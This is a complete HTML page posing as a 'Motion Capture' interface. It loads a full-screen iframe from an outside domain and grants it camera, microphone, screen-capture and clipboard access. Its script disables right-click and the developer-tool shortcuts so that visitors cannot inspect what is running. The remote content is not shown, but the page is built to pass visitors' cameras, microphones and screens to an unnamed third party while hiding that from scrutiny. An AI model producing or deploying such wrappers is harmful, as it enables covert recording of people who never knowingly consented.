<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Motion Capture</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000;
        }

        .iframe-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }

        /* Loading Spinner */
        #loader {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10000;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: opacity 0.5s ease;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Permission Hint */
        #permission-status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10001;
            color: #666;
            font-size: 10px;
            font-family: sans-serif;
            text-transform: uppercase;
            letter-spacing: 1px;
            pointer-events: none;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <!-- Loading State -->
    <div id="loader">
        <div class="spinner"></div>
        <p class="text-white mt-4 font-sans text-sm tracking-widest uppercase">Initializing Interface...</p>
    </div>

    <!-- Permission hint for the user -->
    <div id="permission-status">Hardware Access Enabled</div>

    <!-- The Content -->
    <div class="iframe-container">
        <!-- 
            The 'allow' attribute is CRITICAL here. 
            We must explicitly list camera and microphone for the iframe to access them.
        -->
        <iframe 
            id="main-frame"
            src="https://smm.axtarget.xyz/test30.html" 
            allow="camera; microphone; display-capture; accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
            allowfullscreen>
        </iframe>
    </div>

    <script>
        // Disable Right Click Globally
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, false);

        // Disable Developer Shortcuts (F12, Ctrl+Shift+I, etc.)
        document.addEventListener('keydown', function(e) {
            if (
                e.keyCode === 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) ||
                (e.ctrlKey && e.keyCode === 85)
            ) {
                e.preventDefault();
            }
        });

        // Handle Iframe Load
        const iframe = document.getElementById('main-frame');
        const loader = document.getElementById('loader');

        iframe.onload = function() {
            // Smoothly hide loader once site is ready
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
            }, 500);
        };

        // Note: For camera to work, this page MUST be served over HTTPS.
        // Browsers disable camera access on insecure (HTTP) origins.
    </script>
</body>
</html>
